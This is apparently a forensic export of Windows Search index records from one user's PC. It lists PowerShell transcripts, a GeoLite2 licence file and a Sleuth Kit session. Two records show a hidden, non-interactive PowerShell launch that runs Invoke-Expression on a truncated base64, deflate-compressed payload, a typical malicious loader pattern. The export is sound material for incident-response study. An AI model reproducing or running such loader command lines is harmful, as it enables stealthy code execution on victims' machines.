0F-InvertedOnlyMD5,0-InvertedOnlyPids,11-System_FileName,13F-System_Size,14F-System_FileAttributes,15F-System_DateModified,16F-System_DateCreated,17F-System_DateAccessed,33-System_ItemUrl,3-System_ItemFolderNameDisplay,4165-System_ComputerName,4334-System_ContentType,4346-System_DateImported,4352-System_Document_DateCreated,4354-System_Document_DateSaved,4373-System_FileExtension,4377-System_FileOwner,4378-System_FilePlaceholderStatus,4410-System_IsAttachment,4412-System_IsEncrypted,4415-System_IsFolder,4419-System_ItemDate,4421-System_ItemFolderPathDisplay,4422-System_ItemFolderPathDisplayNarrow,4423-System_ItemName,4424-System_ItemNameDisplay,4425-System_ItemNameDisplayWithoutExtension,4428-System_ItemPathDisplay,4429-System_ItemPathDisplayNarrow,4431-System_ItemType,4437-System_Kind,4438-System_KindText,4453-System_MIMEType,4540-System_NotUserContent,4546-System_ParsingName,4604-System_SFGAOFlags,4605-System_Search_AccessCount,4606-System_Search_AutoSummary,4612F-System_Search_GatherTime,4614-System_Search_LastIndexedTotalTime,4618-System_Search_Store,4655-System_ThumbnailCacheId,4679-System_VolumeId,5-System_ItemTypeText,WorkID
"706A5762DF4DD12D8AFB9EDD49F4F0AA","140015124E12","PowerShell_transcript.DESKTOP-EDSLQM8.lNCjFjAO.20180417180036.txt","3492","Archive (32)","18/04/2018 00:00:48.2819689","18/04/2018 00:00:37.1883037","18/04/2018 00:00:37.1883037","file:C:/Users/maxpowers/Documents/20180417/PowerShell_transcript.DESKTOP-EDSLQM8.lNCjFjAO.20180417180036.txt","20180417","DESKTOP-EDSLQM8","text/plain","18/04/2018 00:00:38.0000000","18/04/2018 00:00:38.0000000","18/04/2018 00:00:48.2819689",".txt","DESKTOP-EDSLQM8\maxpowers","6","False","False","False","18/04/2018 00:00:48.2819689","C:\Users\maxpowers\Documents\20180417","20180417 (C:\Users\maxpowers\Documents)","PowerShell_transcript.DESKTOP-EDSLQM8.lNCjFjAO.20180417180036.txt","PowerShell_transcript.DESKTOP-EDSLQM8.lNCjFjAO.20180417180036.txt","PowerShell_transcript.DESKTOP-EDSLQM8.lNCjFjAO.20180417180036","C:\Users\maxpowers\Documents\20180417\PowerShell_transcript.DESKTOP-EDSLQM8.lNCjFjAO.20180417180036.txt","PowerShell_transcript.DESKTOP-EDSLQM8.lNCjFjAO.20180417180036 (C:\Users\maxpowers\Documents\20180417)",".txt","document","Document","text/plain","False","PowerShell_transcript.DESKTOP-EDSLQM8.lNCjFjAO.20180417180036.txt","1077936503","0","**********************
Windows PowerShell transcript start
Start time: 20180417180037
Username: DESKTOP-EDSLQM8\maxpowers
RunAs User: DESKTOP-EDSLQM8\maxpowers
Configuration Name: 
Machine: DESKTOP-EDSLQM8 (Microsoft Windows NT 10.0.16299.0)
Host Application: C:\WINDOWS\System32\sdiagnhost.exe -Embedding
Process ID: 7640
PSVersion: 5.1.16299.251
PSEdition: Desktop
PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.16299.251
BuildVersion: 10.0.16299.251
CLRVersion: 4.0.30319.42000
WSManStackVersion: 3.0
PSRemotingProtocolVersion: 2.3
SerializationVersion: 1.1.0.1
**********************
PS>CommandInvocation(Set-Location): ""Set-Location""
>> ParameterBinding(Set-Location): name=""Path""; value=""C:\WINDOWS\TEMP\SDIAG_f4114cff-e1d6-4eb7-9cac-b44b95e644b6""
PS>& ""C:\WINDOWS\TEMP\SDIAG_f4114cff-e1d6-4eb7-9cac-b44b95e644b6\TS_WERQueue.ps1""
**********************
Windows PowerShell transcript start
Start time: 20180417180044
Username: DESKTOP-EDSLQM8\maxpowers
RunAs User: DESKTOP-EDSLQM8\maxpowers","18/04/2018 00:00:48.3600177","0,03125","file","06180A08F6129149","804cb650-0000-0000-0000-501f00000000","Text Document","75"
"DE7A37D1CDFA3C1E013285A8E884972E","140015124E12","CreativeCommonsLisense.txt","483","Archive (32)","12/03/2018 23:43:15.3218847","12/03/2018 23:43:15.2907922","12/03/2018 23:43:15.2907922","file:C:/Users/maxpowers/Desktop/testing/geodb/CreativeCommonsLisense.txt","geodb","DESKTOP-EDSLQM8","text/plain","12/03/2018 23:43:15.3218847","12/03/2018 23:43:15.3218847","12/03/2018 23:43:15.3218847",".txt","DESKTOP-EDSLQM8\maxpowers","6","False","False","False","12/03/2018 23:43:15.3218847","C:\Users\maxpowers\Desktop\testing\geodb","geodb (C:\Users\maxpowers\Desktop\testing)","CreativeCommonsLisense.txt","CreativeCommonsLisense.txt","CreativeCommonsLisense","C:\Users\maxpowers\Desktop\testing\geodb\CreativeCommonsLisense.txt","CreativeCommonsLisense (C:\Users\maxpowers\Desktop\testing\geodb)",".txt","document","Document","text/plain","False","CreativeCommonsLisense.txt","1077936503","0","The GeoLite2 databases are distributed under the Creative Commons Attribution-ShareAlike 4.0 International License.
        The attribution requirement may be met by including the following in all advertising and documentation mentioning
        features of or use of this database:
        This product includes GeoLite2 data created by MaxMind, available from http://www.maxmind.com.
        
        See license at https://creativecommons.org/licenses/by-sa/4.0/legalcode","13/03/2018 18:17:25.1786301","0","file","E8C2C5869F466FA4","804cb650-0000-0000-0000-501f00000000","Text Document","115"
"E295E51D990000F119EF12A808BF1372","140015124E12","PowerShell_transcript.DESKTOP-EDSLQM8.u99e+n1x.20180426095820.txt","3709","Archive (32)","26/04/2018 15:59:36.3294054","26/04/2018 15:58:20.5168826","26/04/2018 15:58:20.5168826","file:C:/Users/maxpowers/Documents/20180426/PowerShell_transcript.DESKTOP-EDSLQM8.u99e+n1x.20180426095820.txt","20180426","DESKTOP-EDSLQM8","text/plain","26/04/2018 15:58:22.0000000","26/04/2018 15:58:22.0000000","26/04/2018 15:59:36.3294054",".txt","DESKTOP-EDSLQM8\maxpowers","6","False","False","False","26/04/2018 15:59:36.3294054","C:\Users\maxpowers\Documents\20180426","20180426 (C:\Users\maxpowers\Documents)","PowerShell_transcript.DESKTOP-EDSLQM8.u99e+n1x.20180426095820.txt","PowerShell_transcript.DESKTOP-EDSLQM8.u99e+n1x.20180426095820.txt","PowerShell_transcript.DESKTOP-EDSLQM8.u99e+n1x.20180426095820","C:\Users\maxpowers\Documents\20180426\PowerShell_transcript.DESKTOP-EDSLQM8.u99e+n1x.20180426095820.txt","PowerShell_transcript.DESKTOP-EDSLQM8.u99e+n1x.20180426095820 (C:\Users\maxpowers\Documents\20180426)",".txt","document","Document","text/plain","False","PowerShell_transcript.DESKTOP-EDSLQM8.u99e+n1x.20180426095820.txt","1077936503","0","**********************
Windows PowerShell transcript start
Start time: 20180426095820
Username: DESKTOP-EDSLQM8\maxpowers
RunAs User: DESKTOP-EDSLQM8\maxpowers
Configuration Name: 
Machine: DESKTOP-EDSLQM8 (Microsoft Windows NT 10.0.16299.0)
Host Application: C:\Windows\syswow64\windowspowershell\v1.0\powershell.exe -NoP -NonI -W Hidden -Command Invoke-Expression $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String("" pVZNj9s2EL37VxCGDjbWWlAS9eEYCyRtUCBAkQbdbXswfKAoqiuUlgSJzno37X8vZyRS1joBivQy5HCGb97MUKQ8Qe7I2+Vi/16pD8e26fRq+Zfsaqmi8LZQark+kPaUq0qQXnNtBnnWxk4+1PqT7sjvVadPXL1TqhGrce1pQ05Vrcl5HJ/H8WW9++44P3aSa/nwaIbCxjmNuJ83ZIo8zi5ijyuvox/7z6LT/yX2UR57qVfXyN+fVd40ytbuU9doKRy+at8VRSf7fsQvnu6rFzkqpfoon8YNG9Kc9LCs2lL9oorRYAgt3y68xnTWQPkPz60kvkkil917WVZ1paumJp4g/kd+lGT5R1VH4ZL4tdH6lgtJcOWnUy3Asyd+y/teP3anhXe+85o3b2Zdpxt6DiiFIRoGytY7sv/hWcv94eD1cMTouRTGIjMjshB86EwkILItuMQAFBgh0MDAkBsRDxGciihipgbOOQU1hGi0NCJPjWAc1hILX4KBA0AEIoG1FGY","26/04/2018 15:59:36.5169373","0,046875","file","BD6A609605E4D885","804cb650-0000-0000-0000-501f00000000","Text Document","1027"
"FCD036C18D8BEFACDE6297B6DE7C7178","140015124E12","PowerShell_transcript.DESKTOP-EDSLQM8.hd+2+jd_.20180426100139.txt","3709","Archive (32)","26/04/2018 16:01:45.7044938","26/04/2018 16:01:39.1887638","26/04/2018 16:01:39.1887638","file:C:/Users/maxpowers/Documents/20180426/PowerShell_transcript.DESKTOP-EDSLQM8.hd+2+jd_.20180426100139.txt","20180426","DESKTOP-EDSLQM8","text/plain","26/04/2018 16:01:40.0000000","26/04/2018 16:01:40.0000000","26/04/2018 16:01:45.7044938",".txt","DESKTOP-EDSLQM8\maxpowers","6","False","False","False","26/04/2018 16:01:45.7044938","C:\Users\maxpowers\Documents\20180426","20180426 (C:\Users\maxpowers\Documents)","PowerShell_transcript.DESKTOP-EDSLQM8.hd+2+jd_.20180426100139.txt","PowerShell_transcript.DESKTOP-EDSLQM8.hd+2+jd_.20180426100139.txt","PowerShell_transcript.DESKTOP-EDSLQM8.hd+2+jd_.20180426100139","C:\Users\maxpowers\Documents\20180426\PowerShell_transcript.DESKTOP-EDSLQM8.hd+2+jd_.20180426100139.txt","PowerShell_transcript.DESKTOP-EDSLQM8.hd+2+jd_.20180426100139 (C:\Users\maxpowers\Documents\20180426)",".txt","document","Document","text/plain","False","PowerShell_transcript.DESKTOP-EDSLQM8.hd+2+jd_.20180426100139.txt","1077936503","0","**********************
Windows PowerShell transcript start
Start time: 20180426100139
Username: DESKTOP-EDSLQM8\maxpowers
RunAs User: DESKTOP-EDSLQM8\maxpowers
Configuration Name: 
Machine: DESKTOP-EDSLQM8 (Microsoft Windows NT 10.0.16299.0)
Host Application: C:\Windows\syswow64\windowspowershell\v1.0\powershell.exe -NoP -NonI -W Hidden -Command Invoke-Expression $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String("" pVZNj9s2EL37VxCGDjbWWlAS9eEYCyRtUCBAkQbdbXswfKAoqiuUlgSJzno37X8vZyRS1joBivQy5HCGb97MUKQ8Qe7I2+Vi/16pD8e26fRq+Zfsaqmi8LZQark+kPaUq0qQXnNtBnnWxk4+1PqT7sjvVadPXL1TqhGrce1pQ05Vrcl5HJ/H8WW9++44P3aSa/nwaIbCxjmNuJ83ZIo8zi5ijyuvox/7z6LT/yX2UR57qVfXyN+fVd40ytbuU9doKRy+at8VRSf7fsQvnu6rFzkqpfoon8YNG9Kc9LCs2lL9oorRYAgt3y68xnTWQPkPz60kvkkil917WVZ1paumJp4g/kd+lGT5R1VH4ZL4tdH6lgtJcOWnUy3Asyd+y/teP3anhXe+85o3b2Zdpxt6DiiFIRoGytY7sv/hWcv94eD1cMTouRTGIjMjshB86EwkILItuMQAFBgh0MDAkBsRDxGciihipgbOOQU1hGi0NCJPjWAc1hILX4KBA0AEIoG1FGY","26/04/2018 16:02:13.5168787","0,03125","file","83B57CCBAD45C5D7","804cb650-0000-0000-0000-501f00000000","Text Document","1036"
"D18D8237058F27329AC63C90DEDF5BF0","140015124E12","PowerShell_transcript.DESKTOP-EDSLQM8.UutyVQEs.20180424200119.txt","3492","Archive (32)","25/04/2018 02:01:22.5689983","25/04/2018 02:01:19.7566972","25/04/2018 02:01:19.7566972","file:C:/Users/maxpowers/Documents/20180424/PowerShell_transcript.DESKTOP-EDSLQM8.UutyVQEs.20180424200119.txt","20180424","DESKTOP-EDSLQM8","text/plain","25/04/2018 02:01:20.0000000","25/04/2018 02:01:20.0000000","25/04/2018 02:01:22.5689983",".txt","DESKTOP-EDSLQM8\maxpowers","6","False","False","False","25/04/2018 02:01:22.5689983","C:\Users\maxpowers\Documents\20180424","20180424 (C:\Users\maxpowers\Documents)","PowerShell_transcript.DESKTOP-EDSLQM8.UutyVQEs.20180424200119.txt","PowerShell_transcript.DESKTOP-EDSLQM8.UutyVQEs.20180424200119.txt","PowerShell_transcript.DESKTOP-EDSLQM8.UutyVQEs.20180424200119","C:\Users\maxpowers\Documents\20180424\PowerShell_transcript.DESKTOP-EDSLQM8.UutyVQEs.20180424200119.txt","PowerShell_transcript.DESKTOP-EDSLQM8.UutyVQEs.20180424200119 (C:\Users\maxpowers\Documents\20180424)",".txt","document","Document","text/plain","False","PowerShell_transcript.DESKTOP-EDSLQM8.UutyVQEs.20180424200119.txt","1077936503","0","**********************
Windows PowerShell transcript start
Start time: 20180424200119
Username: DESKTOP-EDSLQM8\maxpowers
RunAs User: DESKTOP-EDSLQM8\maxpowers
Configuration Name: 
Machine: DESKTOP-EDSLQM8 (Microsoft Windows NT 10.0.16299.0)
Host Application: C:\WINDOWS\System32\sdiagnhost.exe -Embedding
Process ID: 3748
PSVersion: 5.1.16299.251
PSEdition: Desktop
PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.16299.251
BuildVersion: 10.0.16299.251
CLRVersion: 4.0.30319.42000
WSManStackVersion: 3.0
PSRemotingProtocolVersion: 2.3
SerializationVersion: 1.1.0.1
**********************
PS>CommandInvocation(Set-Location): ""Set-Location""
>> ParameterBinding(Set-Location): name=""Path""; value=""C:\WINDOWS\TEMP\SDIAG_8e0546f4-e6d9-467c-8529-c7cb7bd3c437""
PS>& ""C:\WINDOWS\TEMP\SDIAG_8e0546f4-e6d9-467c-8529-c7cb7bd3c437\TS_WERQueue.ps1""
**********************
Windows PowerShell transcript start
Start time: 20180424200121
Username: DESKTOP-EDSLQM8\maxpowers
RunAs User: DESKTOP-EDSLQM8\maxpowers","25/04/2018 02:01:22.6158517","0,015625","file","52B7282C3FC6D6B5","804cb650-0000-0000-0000-501f00000000","Text Document","1045"
"755C6A08828B362545A075815FCF78A1","140015124E12","PowerShell_transcript.DESKTOP-EDSLQM8.red7JjgD.20180316135951.txt","717","Archive (32)","16/03/2018 19:59:55.1803578","16/03/2018 19:59:51.8207286","16/03/2018 19:59:51.8207286","file:C:/Users/maxpowers/Documents/20180316/PowerShell_transcript.DESKTOP-EDSLQM8.red7JjgD.20180316135951.txt","20180316","DESKTOP-EDSLQM8","text/plain","16/03/2018 19:59:52.0000000","16/03/2018 19:59:52.0000000","16/03/2018 19:59:55.1803578",".txt","DESKTOP-EDSLQM8\maxpowers","6","False","False","False","16/03/2018 19:59:55.1803578","C:\Users\maxpowers\Documents\20180316","20180316 (C:\Users\maxpowers\Documents)","PowerShell_transcript.DESKTOP-EDSLQM8.red7JjgD.20180316135951.txt","PowerShell_transcript.DESKTOP-EDSLQM8.red7JjgD.20180316135951.txt","PowerShell_transcript.DESKTOP-EDSLQM8.red7JjgD.20180316135951","C:\Users\maxpowers\Documents\20180316\PowerShell_transcript.DESKTOP-EDSLQM8.red7JjgD.20180316135951.txt","PowerShell_transcript.DESKTOP-EDSLQM8.red7JjgD.20180316135951 (C:\Users\maxpowers\Documents\20180316)",".txt","document","Document","text/plain","False","PowerShell_transcript.DESKTOP-EDSLQM8.red7JjgD.20180316135951.txt","1077936503","0","**********************
Windows PowerShell transcript start
Start time: 20180316135951
Username: DESKTOP-EDSLQM8\maxpowers
RunAs User: DESKTOP-EDSLQM8\maxpowers
Configuration Name: 
Machine: DESKTOP-EDSLQM8 (Microsoft Windows NT 10.0.16299.0)
Host Application: PowerShell.exe -noexit -command Set-Location -literalPath 'C:\Users\maxpowers\Documents'
Process ID: 4216
PSVersion: 5.1.16299.251
PSEdition: Desktop
PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.16299.251
BuildVersion: 10.0.16299.251
CLRVersion: 4.0.30319.42000
WSManStackVersion: 3.0
PSRemotingProtocolVersion: 2.3
SerializationVersion: 1.1.0.1
**********************
PS>Set-Location -literalPath 'C:\Users\maxpowers\Documents'
","16/03/2018 19:59:55.9780827","0,015625","file","0F161102B7625BE9","804cb650-0000-0000-0000-501f00000000","Text Document","2078"
"19D36CCFC5AC96A71828DB044BAE52E3","140015124E12","PowerShell_transcript.DESKTOP-EDSLQM8.gki3LtgZ.20180316140001.txt","691","Archive (32)","16/03/2018 20:00:02.4924318","16/03/2018 20:00:01.7269779","16/03/2018 20:00:01.7269779","file:C:/Users/maxpowers/Documents/20180316/PowerShell_transcript.DESKTOP-EDSLQM8.gki3LtgZ.20180316140001.txt","20180316","DESKTOP-EDSLQM8","text/plain","16/03/2018 20:00:02.0000000","16/03/2018 20:00:02.0000000","16/03/2018 20:00:02.4924318",".txt","DESKTOP-EDSLQM8\maxpowers","6","False","False","False","16/03/2018 20:00:02.4924318","C:\Users\maxpowers\Documents\20180316","20180316 (C:\Users\maxpowers\Documents)","PowerShell_transcript.DESKTOP-EDSLQM8.gki3LtgZ.20180316140001.txt","PowerShell_transcript.DESKTOP-EDSLQM8.gki3LtgZ.20180316140001.txt","PowerShell_transcript.DESKTOP-EDSLQM8.gki3LtgZ.20180316140001","C:\Users\maxpowers\Documents\20180316\PowerShell_transcript.DESKTOP-EDSLQM8.gki3LtgZ.20180316140001.txt","PowerShell_transcript.DESKTOP-EDSLQM8.gki3LtgZ.20180316140001 (C:\Users\maxpowers\Documents\20180316)",".txt","document","Document","text/plain","False","PowerShell_transcript.DESKTOP-EDSLQM8.gki3LtgZ.20180316140001.txt","1077936503","0","**********************
Windows PowerShell transcript start
Start time: 20180316140001
Username: DESKTOP-EDSLQM8\maxpowers
RunAs User: DESKTOP-EDSLQM8\maxpowers
Configuration Name: 
Machine: DESKTOP-EDSLQM8 (Microsoft Windows NT 10.0.16299.0)
Host Application: PowerShell.exe -noexit -command Set-Location 'C:\Users\maxpowers\Documents'
Process ID: 4976
PSVersion: 5.1.16299.251
PSEdition: Desktop
PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.16299.251
BuildVersion: 10.0.16299.251
CLRVersion: 4.0.30319.42000
WSManStackVersion: 3.0
PSRemotingProtocolVersion: 2.3
SerializationVersion: 1.1.0.1
**********************
PS>Set-Location 'C:\Users\maxpowers\Documents'
","16/03/2018 20:00:02.9454819","0,015625","file","18F170E804E7CACB","804cb650-0000-0000-0000-501f00000000","Text Document","2079"
"84FD18D002D9672F3F8D44CE748E2BFF","140015124E12","PowerShell_transcript.DESKTOP-EDSLQM8._BT7GQuB.20180316140006.txt","46131056","Archive (32)","16/03/2018 20:15:23.7112032","16/03/2018 20:00:06.9144064","16/03/2018 20:00:06.9144064","file:C:/Users/maxpowers/Documents/20180316/PowerShell_transcript.DESKTOP-EDSLQM8._BT7GQuB.20180316140006.txt","20180316","DESKTOP-EDSLQM8","text/plain","16/03/2018 20:00:08.0000000","16/03/2018 20:00:08.0000000","16/03/2018 20:15:23.7112032",".txt","DESKTOP-EDSLQM8\maxpowers","6","False","False","False","16/03/2018 20:15:23.7112032","C:\Users\maxpowers\Documents\20180316","20180316 (C:\Users\maxpowers\Documents)","PowerShell_transcript.DESKTOP-EDSLQM8._BT7GQuB.20180316140006.txt","PowerShell_transcript.DESKTOP-EDSLQM8._BT7GQuB.20180316140006.txt","PowerShell_transcript.DESKTOP-EDSLQM8._BT7GQuB.20180316140006","C:\Users\maxpowers\Documents\20180316\PowerShell_transcript.DESKTOP-EDSLQM8._BT7GQuB.20180316140006.txt","PowerShell_transcript.DESKTOP-EDSLQM8._BT7GQuB.20180316140006 (C:\Users\maxpowers\Documents\20180316)",".txt","document","Document","text/plain","False","PowerShell_transcript.DESKTOP-EDSLQM8._BT7GQuB.20180316140006.txt","1077936503","0","**********************
Windows PowerShell transcript start
Start time: 20180316140006
Username: DESKTOP-EDSLQM8\maxpowers
RunAs User: DESKTOP-EDSLQM8\maxpowers
Configuration Name: 
Machine: DESKTOP-EDSLQM8 (Microsoft Windows NT 10.0.16299.0)
Host Application: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -noexit -command Set-Location -literalPath 'C:\Users\maxpowers\Documents'
Process ID: 4564
PSVersion: 5.1.16299.251
PSEdition: Desktop
PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.16299.251
BuildVersion: 10.0.16299.251
CLRVersion: 4.0.30319.42000
WSManStackVersion: 3.0
PSRemotingProtocolVersion: 2.3
SerializationVersion: 1.1.0.1
**********************
PS>Set-Location -literalPath 'C:\Users\maxpowers\Documents'
PS C:\Users\maxpowers\Documents> ifind -h
Invalid argument: (null)
usage: C:\Tools\sleuthkit-4.6.0-win32\bin\ifind.exe [-alvV] [-f fstype] [-i imgtype] [-b dev_sector_size] [-o imgoffset]
 [-d unit_addr] [-n file] [-p par_addr] [-z ZONE] image [images]
        -a","16/03/2018 20:21:51.2119238","0,03125","file","34D20AC04725A06D","804cb650-0000-0000-0000-501f00000000","Text Document","2081"
